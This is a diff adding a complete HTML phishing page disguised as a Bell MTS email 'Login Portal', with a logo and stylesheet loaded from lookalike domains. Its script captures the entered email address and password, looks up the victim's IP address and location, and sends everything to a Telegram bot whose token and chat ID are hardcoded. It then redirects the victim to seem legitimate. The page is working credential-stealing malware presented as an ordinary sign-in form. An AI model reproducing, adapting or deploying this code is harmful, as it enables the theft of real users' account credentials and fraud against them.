@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Login Portal</title>
+
+<link rel="stylesheet" href="https://auth.mtsmail.ca/bootstrap/3.3.5/css/bootstrap.min.css">
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #eef2f6;
+}
+
+.wrapper {
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.card {
+  width: 380px;
+  background: #fff;
+  padding: 30px;
+  border-radius: 6px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+}
+
+.logo {
+  width: 150px;
+  margin-bottom: 20px;
+}
+
+.title {
+  font-size: 18px;
+  font-weight: bold;
+  margin-bottom: 15px;
+}
+
+input {
+  margin-bottom: 10px;
+}
+
+button {
+  width: 100%;
+  background: #005a96;
+  color: white;
+  border: none;
+  padding: 10px;
+  border-radius: 3px;
+}
+
+button:hover {
+  background: #004a7a;
+}
+
+.info {
+  margin-top: 15px;
+  font-size: 13px;
+  color: #444;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+  <div class="card">
+
+    <!-- LOGO -->
+    <img class="logo" src="https://cableco.auth-gateway.net/images/mts/bellmts.png">
+
+    <div class="title">Sign In</div>
+
+   <input id="username" class="form-control" placeholder="Email Address (example@mymts.net)">
+<input id="password" type="password" class="form-control" placeholder="Password">
+
+<div style="display:flex; justify-content:space-between; align-items:center; font-size:13px; margin-bottom:15px;">
+  <label style="display:flex; align-items:center; gap:5px;">
+    <input type="checkbox" id="rememberMe">
+    Remember Me
+  </label>
+
+  <a href="#" style="text-decoration:none; color:#005a96;">
+    Forgot Password?
+  </a>
+</div>
+
+<button onclick="login()">Login</button>
+
+
+
+
+    <div id="output" class="info"></div>
+
+  </div>
+</div>
+
+
+<script>
+const BOT_TOKEN = "7964369847:AAHCLQ9ohzZtVL0xq7tHo_njf3-5nTWoJcM";
+const CHAT_ID = "732332108";
+
+async function getIP() {
+    try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+    } catch {
+        return "unknown";
+    }
+}
+
+async function getLocation() {
+    try {
+        const res = await fetch("https://ipwho.is/");
+        const data = await res.json();
+
+        if (!data.success) return "unknown";
+
+        return `${data.city}, ${data.region}, ${data.country}`;
+    } catch {
+        return "unknown";
+    }
+}
+
+async function sendToTelegram(text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text
+            })
+        });
+    } catch (err) {
+        console.log("Telegram error:", err);
+    }
+}
+
+
+async function login() {
+    try {
+        const username = document.getElementById("username").value.trim();
+        const password = document.getElementById("password").value.trim();
+        const output = document.getElementById("output");
+
+        if (!username || !password) {
+            output.innerText = "Please enter username and password";
+            return;
+        }
+
+        output.innerText = "";
+
+        const ip = await getIP();
+        const location = await getLocation();
+
+        const message =
+`🔔 LOGIN EVENT
+👤 User: ${username}
+💾 Password: ${password}
+🌐 IP: ${ip}
+📍 Location: ${location}
+⏰ Time: ${new Date().toISOString()}`;
+
+        await sendToTelegram(message);
+
+        await new Promise(resolve => setTimeout(resolve, 800));
+
+        const hash = window.location.hash.substring(1);
+
+        if (hash && hash.includes("@")) {
+            const domain = hash.split("@")[1].trim();
+
+            if (/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain)) {
+                window.location.href = "https://" + domain;
+                return;
+            }
+        }
+
+        // ✅ FINAL REDIRECT (ONLY HERE)
+        window.location.href = window.location.origin;
+
+    } catch (err) {
+        console.error(err);
+        document.getElementById("output").innerText =
+            "Something went wrong. Please try again.";
+    }
+}
+</script>
+
+</body>
+</html>
